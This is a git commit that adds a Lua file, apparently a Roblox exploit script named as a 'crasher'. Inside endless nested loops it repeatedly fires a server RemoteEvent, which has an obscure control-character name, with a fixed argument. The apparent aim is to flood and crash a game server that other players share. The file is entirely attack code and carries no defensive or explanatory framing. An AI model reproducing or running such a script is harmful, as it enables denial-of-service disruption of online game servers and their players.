d2d63c91f3bb6b5c52de091e34a991726404de2c
mrbirdz <71379363+mrbirdz@users.noreply.github.com>
2022-09-29 01:03:56 +0400

    Create aynicrasherinlaciverti.lua

---
+++ skidwxer/aynicrasherinlaciverti.lua
@@ -0,0 +1,50 @@
+for L_26_forvar0 = 1, 10 do
+    while wait() do
+        while task.wait() do
+            local L_27_ = {
+                [1] = "KuID"
+            }
+            game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(L_27_))
+            local L_28_ = {
+                [1] = "KuID"
+            }
+            game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(L_28_))
+            local L_29_ = {
+                [1] = "KuID"
+            }
+            game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(L_29_))
+            local L_30_ = {
+                [1] = "KuID"
+            }
+            game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(L_30_))
+            local L_31_ = {
+                [1] = "KuID"
+            }
+            game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(L_31_))
+            local L_32_ = {
+                [1] = "KuID"
+            }
+            game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(L_32_))
+            local L_33_ = {
+                [1] = "KuID"
+            }
+            game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(L_33_))
+            local L_34_ = {
+                [1] = "KuID"
+            }
+            game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(L_34_))
+            local L_35_ = {
+                [1] = "KuID"
+            }
+            game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(L_35_))
+            local L_36_ = {
+                [1] = "KuID"
+            }
+            game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(L_36_))
+            local L_37_ = {
+                [1] = "KuID"
+            }
+            game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(L_37_))
+        end
+    end
+end
